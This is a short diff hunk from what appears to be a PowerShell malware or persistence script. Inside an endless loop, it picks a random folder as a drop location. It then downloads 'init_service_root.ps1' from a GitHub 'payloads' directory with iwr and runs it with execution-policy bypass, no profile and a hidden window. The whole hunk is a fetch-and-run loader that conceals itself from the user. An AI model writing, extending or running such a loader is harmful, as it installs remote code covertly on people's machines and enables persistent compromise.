@@ -104,6 +104,9 @@ while ($true) {
     }
     
     elseif($regS -or $serv){
+        $idx = Get-Random -Minimum 0 -Maximum $paths.Length
+        $initServicePath = $paths[$idx]
+        $initServicePath = "$initServicePath\init_service_root.ps1"
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
         powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$b"
     }
